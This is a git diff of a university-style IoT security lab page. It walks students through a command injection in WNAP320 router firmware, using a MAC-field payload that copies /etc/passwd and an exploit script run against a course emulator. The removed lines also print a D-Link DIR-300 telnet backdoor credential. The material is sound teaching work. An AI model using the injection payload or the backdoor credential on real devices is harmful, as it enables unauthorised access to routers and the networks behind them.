@@ -4,8 +4,6 @@ Walkthrough video:
 
 **IoT & CPS 9-1** [https://www.youtube.com/watch?v=nTjmkLGOJZ0](https://www.youtube.com/watch?v=nTjmkLGOJZ0)
 
-## (NOT READY)
-
 ## Intro to IoT CI & CPS
 
 A challenge of dealing with IoT and Cyberphysical Systems in general is that the software runs on specific hardware rather than general purpose computers. Also, there are a number of different operating systems that these devices can use. IoT is different from normal computers in that they have less resources like memory to operate with and usually are diskless.
@@ -133,6 +131,14 @@ This code file is responsible for showing this page to capture a MAC address for
 
 ![Screen handled by boardDataWW.php](../.gitbook/assets/screen-shot-2021-07-09-at-2.26.16-pm.png)
 
+I have set up an emulation of this firmware so you can access the router page from your browser. You can go to the address shown in the below infobox.
+
+{% hint style="info" %}
+Currently, the emulator is running at [http://34.66.53.228](http://34.66.53.228) (you can also check it out using your browser). If this address changes, you will see an update here.&#x20;
+
+If the address doesn't work, please let the Unit Coordinator know.
+{% endhint %}
+
 When the user enters a MAC address and clicks the submit button, the code above checks that it has been sent a valid MAC address (12 characters, alphanumeric) and a region code, and then it passes that to a command line utility called `wr_mfg_data`. If the MAC address was `f8ffc201fae5` and region code was 1, the command that would be executed would be:
 
 ```bash
@@ -145,16 +151,14 @@ You will notice that there is no validation of the input to this command by the 
 wr_mfg_data -m f8ffc201fae5;cp /etc/passwd test.html; -c 1
 ```
 
-To achieve this we would put `f8ffc201fae5;cp /etc/passwd test.html;` into the text box for the MAC address. The second command copies the password file to an HTML file test.html that we can then access from the website.
-
-For this to work, we need to bypass a JavaScript validation check in the browser of the MAC address but that is trivial to do, which we will do below.
+To achieve this we would put `f8ffc201fae5;cp /etc/passwd test.html;` into the text box for the MAC address. The second command copies the password file to an HTML file test.html that we can then access from the website. However, for this to work, we need to bypass a JavaScript validation check in the browser of the MAC address but that is trivial to do, which we will do below.
 
 ### Testing the Vulnerability
 
-Instead of going out and buying a wireless router to test this on, we can run the firmware in an emulator. There is an open source toolset that allows you to do that called `Firmadyne`. It is beyond the scope of this lab to set that up and get it running however, there is a version that I have set up on a Cloud VM that you can access with an exploit script. To run this, you can type:
+Instead of going out and buying a wireless router to test this on, we can run the firmware in an emulator as I have setup above. There is an open source toolset that allows you to do that called `Firmadyne`. However, it is beyond the scope of this lab to set that up and get it running. Instead, you can access the emulator server I have setup and use the exploit script on it. To run this, you can type:
 
 ```bash
-root@c3e1d7ac5055:/opt/samples/WNAP320# ./exploit.py /etc/passwd
+root@c3e1d7ac5055:/opt/samples/WNAP320# ./exploit.py 34.66.53.228 /etc/passwd
 root:x:0:0:root:/root:/bin/sh
 daemon:x:1:1:daemon:/usr/sbin:/bin/sh
 bin:x:2:2:bin:/bin:/bin/sh
@@ -172,11 +176,17 @@ sshd:x:103:99:Operator:/var:/bin/sh
 admin:x:0:0:Default non-root user:/home/cli/menu:/usr/sbin/cli
 ```
 
-If you are interested, you can look at the code in the Python script exploit.py. It takes one argument, the file on the router you want to look at. Of course, the script could be changed to insert a backdoor into the router and then gain access to the network that the router is connected to.
+The exploit code also copies the content of the `/etc/passwd` into the `test.html` page - so if you go to the `http://[emulator address]/test.html`, you should be able to see the content of `/etc/passwd` (note that, you couldn't do this via the web interface because it got blocked by the Javascript!).
+
+{% hint style="warning" %}
+Because this emulator will be shared with other students, you may see different content inside `test.html` if the other students loaded a different content inside. However, the chances of this happening should be very low. If any issues, contact the Unit Coordinator.
+{% endhint %}
+
+If you are interested, you can look at the code in the Python script `exploit.py`. It takes two arguments, the address of the emulation and the file on the router you want to look at. Of course, the script could be changed to insert a backdoor into the router and then gain access to the network that the router is connected to (but it is outside the scope of this unit).
 
 ## Question 1. Exploit to find the flag
 
-**Flag: Run exploit.py and pass the argument flag.txt**
+Flag: Run `exploit.py` and pass the argument `flag.txt`
 
 ## Searching for Hard Coded Credentials
 
@@ -200,7 +210,7 @@ drwxr-xr-x 1 root root    4096 Jul 10 02:14 ..
 drwxr-xr-x 3 root root    4096 Jul 10 02:14 _DIR-300A1_FW105b09.bin.extracted
 ```
 
-We can now cd into the directory \_DIR-300A1\_FW105b09.bin.extracted and then into the directory squashfs-root. Again we have a Linux filesystem
+We can now cd into the directory `_DIR-300A1_FW105b09.bin.extracted` and then into the directory `squashfs-root`. Again we have a Linux filesystem
 
 ```bash
 root@c3e1d7ac5055:/opt/samples/DIR300/_DIR-300A1_FW105b09.bin.extracted/squashfs-root# ls -al
@@ -226,37 +236,23 @@ You can explore the file system a bit to see where things are but to shortcut, w
 
 ```bash
 /squashfs-root# grep -ir telnet *
+etc/defnodes/S11setnodes.php:set("/sys/telnetd",                        "true");
+etc/scripts/system.sh:  # start telnet daemon
+etc/scripts/system.sh:  /etc/scripts/misc/telnetd.sh    > /dev/console
 etc/scripts/misc/telnetd.sh:TELNETD=`rgdb -g /sys/telnetd`
 etc/scripts/misc/telnetd.sh:if [ "$TELNETD" = "true" ]; then
-etc/scripts/misc/telnetd.sh:	echo "Start telnetd ..." > /dev/console
-etc/scripts/misc/telnetd.sh:		telnetd -l "/usr/sbin/login" -u Alphanetworks:$image_sign -i $lf &
-etc/scripts/misc/telnetd.sh:		telnetd &
-etc/scripts/system.sh:	# start telnet daemon
-etc/scripts/system.sh:	/etc/scripts/misc/telnetd.sh	> /dev/console
-etc/defnodes/S11setnodes.php:set("/sys/telnetd",			"true");
+etc/scripts/misc/telnetd.sh:    echo "Start telnetd ..." > /dev/console
+etc/scripts/misc/telnetd.sh:            telnetd -l "/usr/sbin/login" -u Alphanetworks:$image_sign -i $lf &
+etc/scripts/misc/telnetd.sh:            telnetd &
 Binary file usr/lib/tc/q_netem.so matches
-www/__adv_port.php:					<option value='Telnet'>Telnet</option>
+www/__adv_port.php:                                     <option value='Telnet'>Telnet</option>
 ```
 
-The file that is interesting is the script telnetd.sh where there is a login command with a -u flag that passes in a username and password. If we open the script and look at it we notice that the variable $image\_sign gets set to the contents of a file:
+{% hint style="warning" %}
+On PowerShell, the path may not show in the console. You can copy the text and paste in a text editor to see them.
+{% endhint %}
 
-```bash
-#!/bin/sh
-image_sign=`cat /etc/config/image_sign`
-```
-
-And if we look at the contents of that file we get:
-
-```bash
-/squashfs-root# cat ./etc/config/image_sign 
-wrgg19_c_dlwbr_dir300
-```
-
-So the username and password for the device is
-
-```bash
-Alphanetworks:wrgg19_c_dlwbr_dir300
-```
+The file that is interesting is the script `telnetd.sh` where there is a login command with a `-u` flag that passes in a username (e.g., `Alphanetworks`) and password. Here, the password is passed in as a variable `image_sign`. So now let's inspect the `telnetd.sh` to see if we can find any information about `image_sign`. Keep tracking the leads and you should be able to find the password.
 
 The dir300 is the model number and the other parts of the password don't change much between models. Others have compiled a list of possible passwords for DLINK routers ([https://github.com/rapid7/metasploit-framework/blob/master/data/wordlists/dlink\_telnet\_backdoor\_userpass.txt](https://github.com/rapid7/metasploit-framework/blob/master/data/wordlists/dlink\_telnet\_backdoor\_userpass.txt)).
 
